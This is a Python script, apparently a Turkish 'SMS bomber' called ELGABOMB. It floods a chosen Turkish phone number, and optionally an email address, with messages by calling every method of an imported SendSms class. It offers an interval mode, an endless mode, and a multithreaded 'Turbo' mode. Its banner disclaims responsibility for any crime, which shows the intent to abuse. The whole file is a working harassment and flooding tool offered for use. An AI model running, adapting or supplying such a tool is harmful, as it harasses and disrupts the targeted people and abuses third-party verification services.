# -*- coding: utf-8 -*-
from colorama import Fore, Style
from time import sleep
from os import system
from sms import SendSms
import threading
import os

# Servisleri topla
servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value) and not attribute.startswith('__'):
        servisler_sms.append(attribute)

# Açılış
print("ELGABOMB Açılıyor🔥🔥🔥...")
for i in range(3, 0, -1):
    print(f"{i} saniye...")
    sleep(1)

system("cls" if os.name == "nt" else "clear")

# Ana döngü
while True:
    system("cls" if os.name == "nt" else "clear")
    print(r"""{}
     ______   _                   ___                   ___ 
    | _____ _     _____ ____    ____  ____  _      ____ 
/  __// \   /  __//  _ \  /  __\/  _ \/ \__/|/  __\
|  \  | |   | |  _| / \|  | | //| / \|| |\/||| | //
|  /_ | |_/\| |_//| |-||  | |_\\| \_/|| |  ||| |_\\
\____\\____/\____\\_/ \|  \____/\____/\_/  \|\____/

    Sms: {}           {}by {}@elgamex
    {}İnsta:@elgamex__
    SUÇ KULLANAN KİŞİYE AİTTİR
    """.format(Fore.LIGHTCYAN_EX, len(servisler_sms), Style.RESET_ALL, Fore.LIGHTRED_EX))

    try:
        menu_text = Fore.LIGHTMAGENTA_EX + Style.BRIGHT + """
╔═════════════════════════════╗
║           🔥 ELGA BOMB 🔥          ║
╠═════════════════════════════╣
║ 1 - Normal Mod                   ║
║ 2 - Turbo Mod                    ║
║ 3 - Çıkış Yap                    ║
╚═════════════════════════════╝
""" + Fore.LIGHTYELLOW_EX + "\nSeçim: "
        menu = input(menu_text)
        if menu == "":
            continue
        menu = int(menu)
    except ValueError:
        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar dene.")
        sleep(3)
        continue

    if menu == 3:
        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
        break

    elif menu in [1, 2]:
        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yaz: " + Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
        except ValueError:
            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar dene.")
            sleep(3)
            continue

        print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsan 'enter' tuşuna bas): " + Fore.LIGHTGREEN_EX, end="")
        mail = input()
        if ("@" not in mail or ".com" not in mail) and mail != "":
            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar dene.")
            sleep(3)
            continue

        if menu == 1:
            print(Fore.LIGHTYELLOW_EX + "Kaç adet SMS göndermek istiyorsun (Sonsuz ise 'enter'): " + Fore.LIGHTGREEN_EX, end="")
            kere_input = input()
            try:
                kere = int(kere_input) if kere_input else None
            except ValueError:
                print(Fore.LIGHTRED_EX + "Hatalı sayı girdin. Tekrar dene.")
                sleep(3)
                continue

            print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla göndermek istiyorsun: " + Fore.LIGHTGREEN_EX, end="")
            try:
                aralik = int(input())
            except ValueError:
                print(Fore.LIGHTRED_EX + "Hatalı sayı girdin. Tekrar dene.")
                sleep(3)
                continue

            sms = SendSms(tel_no, mail)
            if kere is None:
                while True:
                    for fonk in servisler_sms:
                        getattr(sms, fonk)()
                        sleep(aralik)
            else:
                while sms.adet < kere:
                    for fonk in servisler_sms:
                        if sms.adet >= kere:
                            break
                        getattr(sms, fonk)()
                        sleep(aralik)

        elif menu == 2:
            send_sms = SendSms(tel_no, mail)
            dur = threading.Event()

            def Turbo():
                while not dur.is_set():
                    thread = []
                    for fonk in servisler_sms:
                        t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
                        thread.append(t)
                        t.start()
                    for t in thread:
                        t.join()

            try:
                Turbo()
            except KeyboardInterrupt:
                dur.set()
                print("\nCtrl+C algılandı. Menüye dönülüyor...")
                sleep(2)

        print(Fore.LIGHTRED_EX + "\nMenüye dönmek için 'enter' tuşuna bas...")
        input()
